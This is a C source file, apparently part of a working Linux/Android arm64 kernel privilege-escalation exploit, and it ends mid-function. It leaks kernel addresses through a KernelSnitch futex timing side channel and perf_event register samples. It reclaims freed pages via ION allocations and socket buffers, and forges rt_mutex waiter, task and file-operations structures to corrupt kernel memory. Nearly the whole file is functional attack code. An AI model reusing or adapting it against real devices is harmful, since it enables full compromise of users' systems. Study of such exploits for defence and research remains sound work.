#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
#ifndef RT_MUTEX_WAITERS_OFF
#define RT_MUTEX_WAITERS_OFF 0x08
#endif
#ifndef RT_MUTEX_OWNER_OFF
#define RT_MUTEX_OWNER_OFF 0x18
#endif
#ifndef LEGACY_RECLAIM_SEND_SIZE
#define LEGACY_RECLAIM_SEND_SIZE SKB_SEND_SIZE
#endif
#ifndef LEGACY_RECLAIM_SOCKETS
#define LEGACY_RECLAIM_SOCKETS 1
#endif
static int reclaim_sv[LEGACY_RECLAIM_SOCKETS][2] = {
  [0 ... LEGACY_RECLAIM_SOCKETS - 1] = {-1, -1}
};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;
static size_t forced_pre_ctx_mm_count;
static size_t fops_pre_ctx_sequence_cursor;
uintptr_t runtime_waiter_task;
uintptr_t runtime_waiter_stack_waiter;
uintptr_t runtime_file_fops_target;

static void perf_ring_copy(void *dst, const unsigned char *ring,
                           size_t ring_size, uint64_t pos, size_t len) {
  size_t off = (size_t)(pos % ring_size);
  size_t first = ring_size - off;
  if (first > len) first = len;
  memcpy(dst, ring + off, first);
  if (first < len) memcpy((unsigned char *)dst + first, ring, len - first);
}

/* el0_svc_common keeps current (SP_EL0) in x22 across this interval. */
int leak_current_task_perf(void) {
#if defined(PERF_CURRENT_TASK_WAITER) && PERF_CURRENT_TASK_WAITER
  struct perf_event_attr attr = {0};
  attr.type = PERF_TYPE_HARDWARE;
  attr.size = sizeof(attr);
  attr.config = PERF_COUNT_HW_CPU_CYCLES;
  attr.disabled = 1;
  attr.exclude_user = 1;
  attr.exclude_hv = 1;
  attr.sample_period = 50000;
  attr.sample_type = PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = (1ULL << 33) - 1;
  attr.wakeup_events = 1;
  int fd = (int)syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
  if (fd < 0) {
    pr_error("perf current-task open failed errno=%d\n", errno);
    return 0;
  }
  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  size_t ring_size = page_size * 16;
  size_t map_size = page_size + ring_size;
  unsigned char *mapping = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
                                MAP_SHARED, fd, 0);
  if (mapping == MAP_FAILED) {
    pr_error("perf current-task mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  struct perf_event_mmap_page *meta = (void *)mapping;
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 250000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  uint64_t head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
  uint64_t tail = meta->data_tail;
  if (head - tail > ring_size) tail = head - ring_size;
  uintptr_t candidate = 0;
  uintptr_t stack_base_candidate = 0;
  int votes = 0;
  while (tail < head) {
    struct perf_event_header hdr;
    perf_ring_copy(&hdr, mapping + page_size, ring_size, tail, sizeof(hdr));
    if (hdr.size < sizeof(hdr) || hdr.size > 1024) { tail++; continue; }
    unsigned char sample[1024];
    perf_ring_copy(sample, mapping + page_size, ring_size, tail, hdr.size);
    if (hdr.type == PERF_RECORD_SAMPLE &&
        hdr.size >= sizeof(hdr) + 8 + 34 * sizeof(uint64_t)) {
      uint64_t *regs = (void *)(sample + sizeof(hdr) + 8);
      uintptr_t x22 = (uintptr_t)regs[23];
      uintptr_t x28 = (uintptr_t)regs[29];
      uintptr_t kernel_sp = (uintptr_t)regs[32];
      uintptr_t pc = (uintptr_t)regs[33];
      size_t image_low = pc & (SLIDE_ALIGNMENT - 1);
      if (regs[0] == PERF_SAMPLE_REGS_ABI_64 &&
          image_low >= 0x11108 && image_low < 0x11218 &&
          x22 == x28 && x22 >= 0xffffffc000000000ULL &&
          x22 < 0xffffffff00000000ULL && !(x22 & 0xf)) {
        uintptr_t stack_base = kernel_sp & ~(uintptr_t)0x3fff;
        if (candidate == x22 && stack_base_candidate == stack_base) votes++;
        else {
          candidate = x22;
          stack_base_candidate = stack_base;
          votes = 1;
        }
      }
    }
    tail += hdr.size;
  }
  __atomic_store_n(&meta->data_tail, tail, __ATOMIC_RELEASE);
  munmap(mapping, map_size);
  close(fd);
  if (votes < 2) {
    pr_error("perf current-task leak failed candidate=%016zx votes=%d head=%llu\n",
             candidate, votes, (unsigned long long)head);
    return 0;
  }
  runtime_waiter_task = candidate;
#if defined(PERF_CURRENT_STACK_WAITER) && PERF_CURRENT_STACK_WAITER
  runtime_waiter_stack_waiter =
      stack_base_candidate + PSELECT_STACK_WAITER_OFF;
#else
  runtime_waiter_stack_waiter = 0;
#endif
  pr_success("perf current-task task=%016zx stack_waiter=%016zx votes=%d "
             "head=%llu\n", runtime_waiter_task,
             runtime_waiter_stack_waiter, votes, (unsigned long long)head);
  return 1;
#else
  return 1;
#endif
}


static int env_size_t_override(const char *name, size_t *value) {
  const char *raw = getenv(name);
  if (!raw || !*raw) {
    return 0;
  }
  char *end = NULL;
  errno = 0;
  unsigned long parsed = strtoul(raw, &end, 0);
  if (errno || end == raw || *end || parsed > 1024UL) {
    return 0;
  }
  *value = (size_t)parsed;
  return 1;
}
static int env_size_t_sequence_value(const char *name, size_t index,
                                     size_t *value) {
  const char *raw = getenv(name);
  if (!raw || !*raw) {
    return 0;
  }

  size_t values[128];
  size_t count = 0;
  const char *p = raw;
  while (*p && count < (sizeof(values) / sizeof(values[0]))) {
    while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == ':') {
      p++;
    }
    if (!*p) {
      break;
    }
    char *end = NULL;
    errno = 0;
    unsigned long parsed = strtoul(p, &end, 0);
    if (errno || end == p || parsed < 1 || parsed > 4096UL) {
      break;
    }
    values[count++] = (size_t)parsed;
    p = end;
  }
  if (!count) {
    return 0;
  }
  *value = values[index % count];
  return 1;
}


static int env_size_t_list_contains(const char *name, size_t value,
                                    int *configured) {
  const char *raw = getenv(name);
  if (!raw || !*raw) {
    if (configured) {
      *configured = 0;
    }
    return 0;
  }
  if (configured) {
    *configured = 1;
  }
  const char *p = raw;
  while (*p) {
    while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' ||
           *p == ':') {
      p++;
    }
    if (!*p) {
      break;
    }
    char *end = NULL;
    errno = 0;
    unsigned long parsed = strtoul(p, &end, 0);
    if (end == p) {
      break;
    }
    if (!errno && parsed <= 1024UL && (size_t)parsed == value) {
      return 1;
    }
    p = end;
  }
  return 0;
}

#if defined(LEGACY_ION_RECLAIM) && LEGACY_ION_RECLAIM
struct legacy_ion_allocation_data {
  uint64_t len;
  uint64_t align;
  uint32_t heap_id_mask;
  uint32_t flags;
  int32_t handle;
  uint32_t padding;
};

struct legacy_ion_fd_data {
  int32_t handle;
  int32_t fd;
};

#define LEGACY_ION_IOC_ALLOC \
  _IOWR('I', 0, struct legacy_ion_allocation_data)
#define LEGACY_ION_IOC_SHARE _IOWR('I', 4, struct legacy_ion_fd_data)

static int legacy_ion_fd = -1;
static int legacy_ion_pre_handles[LEGACY_ION_PREALLOC_COUNT];
static int legacy_ion_payload_fds[LEGACY_ION_RECLAIM_COUNT];
static void *legacy_ion_payload_maps[LEGACY_ION_RECLAIM_COUNT];
static int legacy_ion_payload_count;

static int legacy_ion_alloc_handle(size_t len) {
  struct legacy_ion_allocation_data alloc = {
    .len = len,
    .align = PAGE_SIZE,
    .heap_id_mask = 1U << 0,
    .flags = 1,
  };
  if (ioctl(legacy_ion_fd, LEGACY_ION_IOC_ALLOC, &alloc) != 0) {
    return -1;
  }
  return alloc.handle;
}

static int legacy_ion_preallocate(void) {
  legacy_ion_fd = open("/dev/ion", O_RDWR | O_CLOEXEC);
  if (legacy_ion_fd < 0) return 0;
  int count = 0;
  for (; count < LEGACY_ION_PREALLOC_COUNT; count++) {
    int handle = legacy_ion_alloc_handle(SKB_SEND_SIZE);
    if (handle < 0) break;
    legacy_ion_pre_handles[count] = handle;
  }
  return count;
}

static int legacy_ion_reclaim_payload(void) {
  int count = 0;
  legacy_ion_payload_count = 0;
  for (; count < LEGACY_ION_RECLAIM_COUNT; count++) {
    int handle = legacy_ion_alloc_handle(SKB_SEND_SIZE);
    if (handle < 0) break;
    struct legacy_ion_fd_data share = {.handle = handle, .fd = -1};
    if (ioctl(legacy_ion_fd, LEGACY_ION_IOC_SHARE, &share) != 0) break;
    void *map = mmap(NULL, SKB_SEND_SIZE, PROT_READ | PROT_WRITE,
                     MAP_SHARED, share.fd, 0);
    if (map == MAP_FAILED) {
      close(share.fd);
      break;
    }
    memcpy(map, skb_buf, SKB_SEND_SIZE);
    legacy_ion_payload_fds[count] = share.fd;
    legacy_ion_payload_maps[count] = map;
    legacy_ion_payload_count = count + 1;
  }
  return count;
}
#endif

size_t diagnose_ion_payload_mutations(void) {
#if defined(LEGACY_ION_RECLAIM) && LEGACY_ION_RECLAIM
  if (!skb_buf || legacy_ion_payload_count <= 0) {
    pr_warning("ion mutation scan unavailable payload=%p count=%d\n",
               skb_buf, legacy_ion_payload_count);
    return 0;
  }

  size_t changed_words = 0;
  size_t logged_words = 0;
  for (int map_index = 0; map_index < legacy_ion_payload_count; map_index++) {
    unsigned char *observed = legacy_ion_payload_maps[map_index];
    if (!observed) continue;
    msync(observed, SKB_SEND_SIZE, MS_INVALIDATE);
    for (size_t off = 0; off < SKB_SEND_SIZE; off += sizeof(uint64_t)) {
      if (memcmp(observed + off, skb_buf + off, sizeof(uint64_t)) == 0) {
        continue;
      }
      uint64_t before = 0;
      uint64_t after = 0;
      memcpy(&before, skb_buf + off, sizeof(before));
      memcpy(&after, observed + off, sizeof(after));
      changed_words++;
      if (logged_words++ < 128) {
        size_t order3_off = off % ORDER3_SIZE;
        pr_info("ion mutation map=%d off=%05zx order3_off=%04zx "
                "kva=%016zx before=%016llx after=%016llx\n",
                map_index, off, order3_off,
                (size_t)(page_base + SKB_DATA_DELTA + order3_off),
                (unsigned long long)before,
                (unsigned long long)after);
      }
    }
  }
  pr_info("ion mutation scan maps=%d bytes=%zu changed_words=%zu logged=%zu\n",
          legacy_ion_payload_count,
          (size_t)legacy_ion_payload_count * SKB_SEND_SIZE, changed_words,
          logged_words < 128 ? logged_words : (size_t)128);
  return changed_words;
#else
  return 0;
#endif
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static int rmg_fast_profile_enabled(void) {
#if defined(APP_DEFAULT_FAST_KSNITCH) && APP_DEFAULT_FAST_KSNITCH
  return 1;
#else
  const char *value = getenv("RMG_FAST");
  return value && *value && strcmp(value, "0") != 0;
#endif
}

static size_t rmg_profile_env_size(const char *name, size_t fallback,
                                   size_t min, size_t max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  unsigned long long parsed = strtoull(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    pr_warning("ignoring invalid %s=%s\n", name, value);
    return fallback;
  }
  return (size_t)parsed;
}

static void configure_kernelsnitch_profile(
    struct kernelsnitch_shared_state *state, int payload_mode) {
  size_t appended_futexes = APPENDED_FUTEXES;
  size_t repeat_measurement = REPEAT_MEASUREMENT;
  size_t average = AVERAGE;

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
    repeat_measurement = SLIDE_KSNITCH_REPEAT_MEASUREMENT;
    average = SLIDE_KSNITCH_AVERAGE;
  }

  /*
   * Collision measurement dominates the wall time on E2S.  FAST keeps the
   * collision count, confirmation count and exact address search unchanged;
   * it only uses the shorter measurement profile already proven by the slide
   * consumer.  Explicit variables make hardware A/B testing possible without
   * producing a new payload for every sample count.
   */
  if (rmg_fast_profile_enabled()) {
    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
    if (repeat_measurement > 32) {
      repeat_measurement = 32;
    }
    if (average > 4) {
      average = 4;
    }
  }
#endif

  appended_futexes = rmg_profile_env_size(
      "RMG_KSNITCH_APPENDED", appended_futexes, 256, 4096);
  repeat_measurement = rmg_profile_env_size(
      "RMG_KSNITCH_REPEAT", repeat_measurement, 8, REPEAT_MEASUREMENT);
  average = rmg_profile_env_size(
      "RMG_KSNITCH_AVERAGE", average, 1, repeat_measurement);
  if (average > repeat_measurement) {
    average = repeat_measurement;
  }

  kernelsnitch_set_profile(state, appended_futexes, repeat_measurement,
                           average);
  pr_info("KernelSnitch profile mode=%d fast=%d appended=%zu repeat=%zu "
          "average=%zu\n",
          payload_mode, rmg_fast_profile_enabled(), appended_futexes,
          repeat_measurement, average);
}

static void log_mm_slabinfo(const char *stage) {
  if (!getenv("SLUB_DIAG")) {
    return;
  }

  FILE *fp = fopen("/proc/slabinfo", "re");
  if (!fp) {
    pr_warning("mm slabinfo stage=%s open errno=%d\n", stage, errno);
    return;
  }

  char line[512];
  int found = 0;
  while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "mm_struct ", strlen("mm_struct ")) != 0) {
      continue;
    }
    pr_info("mm slabinfo stage=%s %s", stage, line);
    found = 1;
    break;
  }
  fclose(fp);
  if (!found) {
    pr_warning("mm slabinfo stage=%s entry missing\n", stage);
  }
}
#endif

static void log_mm_slabinfo_port(const char *stage) {
  if (!getenv("SLUB_DIAG")) return;
  FILE *fp = fopen("/proc/slabinfo", "re");
  if (!fp) return;
  char line[512];
  while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "mm_struct ", strlen("mm_struct ")) == 0) {
      pr_info("mm port slabinfo stage=%s %s", stage, line);
      break;
    }
  }
  fclose(fp);
}
uintptr_t fops_leaked_mm;


#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
static const uintptr_t slide_bank_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
static uintptr_t slide_bank_payload_base;
static uintptr_t slide_bank_parents[SLIDE_BANK_SLOTS];
static uintptr_t slide_bank_targets[SLIDE_BANK_SLOTS];

_Static_assert(
    SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_TASK_STRIDE +
            FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t) <=
        SLIDE_BANK_LOCK_OFF,
    "slide task bank overlaps lock bank");
_Static_assert(
    SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
        ORDER3_SIZE,
    "slide lock bank exceeds reclaimed page");
#if defined(APP_FOPS_TABLE_MIRROR_OFF)
_Static_assert(
    APP_FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
    "mirrored FOPS table overlaps primary FOPS table");
#endif
#endif

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
uintptr_t slide_p0_offset;
uintptr_t slide_oracle_parent;
uintptr_t slide_oracle_target;
uintptr_t p0_gate_page_struct;
uintptr_t p0_probe_page_struct;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
uintptr_t fops_data_probe_addr;
int fops_data_probe_active;
int data_alias_uses_slide = 1;
#endif
char ashmem_path[256] = "/dev/ashmem";

static void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                            uintptr_t tree_parent, uintptr_t tree_right,
                            uintptr_t tree_left, uintptr_t pi_parent,
                            uintptr_t pi_right, uintptr_t pi_left,
                            uintptr_t task, uintptr_t lock,
                            uint32_t priority) {
  put64(payload, waiter_off + 0x00, tree_parent);
  put64(payload, waiter_off + 0x08, tree_right);
  put64(payload, waiter_off + 0x10, tree_left);
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
#if COMPACT_RT_MUTEX_WAITER
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
#endif
  put32(payload, waiter_off + FAKE_WAITER_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_DEADLINE_OFF, 0);
#if COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
#else
  put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
int select_slide_payload_slot(uintptr_t offset) {
  if (!slide_bank_payload_base) {
    return 0;
  }
  for (size_t i = 0;
       i < sizeof(slide_bank_offsets) / sizeof(slide_bank_offsets[0]); i++) {
    if (slide_bank_offsets[i] != offset) {
      continue;
    }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    return select_slide_payload_index(1);
#else
    return select_slide_payload_index(i);
#endif
  }
  return 0;
}

int select_slide_payload_index(size_t index) {
  if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
    return 0;
  }
  fake_task = slide_bank_payload_base + SLIDE_BANK_TASK_OFF +
              index * SLIDE_BANK_TASK_STRIDE;
  fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
              index * SLIDE_BANK_SLOT_STRIDE;
  fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
  slide_oracle_parent = slide_bank_parents[index];
  slide_oracle_target = slide_bank_targets[index];
  return 1;
}

static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
                                 size_t slot, uintptr_t parent,
                                 uintptr_t target) {
  size_t task_off = SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
  size_t lock_off = SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
  size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
  uintptr_t task = payload_base + task_off;
  uintptr_t lock = payload_base + lock_off;
  uintptr_t waiter = payload_base + waiter_off;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = target;
  uintptr_t lock_owner = SLIDE_LOCK_OWNER_VALUE;
  uintptr_t waiter_task = task;
  uintptr_t task_group = 0;
  uintptr_t pi_waiters = waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF;
  uintptr_t pi_top_task = task;
  uint32_t waiter_prio = SLIDE_FAKE_WAITER_PRIO;

#if defined(P0_ORACLE_PRODUCTION_SLOT)
  if (slot == P0_ORACLE_PRODUCTION_SLOT) {
#if defined(APP_PRODUCTION_SLOT_PI_RIGHT) && \
    APP_PRODUCTION_SLOT_PI_RIGHT
    pi_right = target;
    pi_left = 0;
#elif defined(APP_PRODUCTION_SLOT_PROVEN_LEFT) && \
    APP_PRODUCTION_SLOT_PROVEN_LEFT
    /* Use the child direction proven by the exact gate/probe/restore writes. */
    pi_right = 0;
    pi_left = target;
#endif
#if defined(APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY) && \
    APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY
    /* Match the established non-banked PAGE_PAYLOAD_FOPS construction. */
    lock_owner = task | 1;
    waiter_task = runtime_waiter_task ? runtime_waiter_task : text_addr(INIT_TASK);
    task_group = text_addr(ROOT_TASK_GROUP);
    pi_waiters = 0;
    pi_top_task = text_addr(INIT_TASK);
    waiter_prio = FAKE_WAITER_PRIO;
#endif
  }
#endif

  put32(p, lock_off + 0x00, 0);
  put64(p, lock_off + 0x08, waiter);
  put64(p, lock_off + 0x10, waiter);
  put64(p, lock_off + 0x18, lock_owner);
#if RT_MUTEX_WAITERS_OFF != 0x08
  put64(p, lock_off + RT_MUTEX_WAITERS_OFF, waiter);
  put64(p, lock_off + RT_MUTEX_WAITERS_OFF + 0x08, waiter);
#endif
#if RT_MUTEX_OWNER_OFF != 0x18
  put64(p, lock_off + RT_MUTEX_OWNER_OFF, lock_owner);
#endif
  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, pi_right, pi_left,
                  waiter_task, lock, waiter_prio);
  put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
  put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
  put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
  put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
  put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
  put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
}
#endif

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
  configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0); /* DIAG */
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  kernelsnitch_set_profile(
      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
      SLIDE_KSNITCH_AVERAGE);
#endif
#endif
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
#if KERNELSNITCH_MTE_ENABLED
  if (leaked != (uintptr_t)-1) {
    uintptr_t tagged = leaked;
    leaked |= 0xff00000000000000ULL;
    pr_info("KernelSnitch mm_struct tagged=%016zx untagged=%016zx\n",
            tagged, leaked);
  }
#endif
  return leaked;
}
#endif

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  return canonicalize_kernelsnitch_pointer(leaked);
#else
  return leaked;
#endif
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
             (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  const char *forced = getenv("ASHMEM_PATH_RUNTIME");
  if (forced && forced[0] == '/' && try_cache_ashmem_path(forced)) {
    return;
  }

  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  errno = 0;
  int fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("ashmem open failed path=%s errno=%d\n", ashmem_path, errno);
  }
  return fd;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
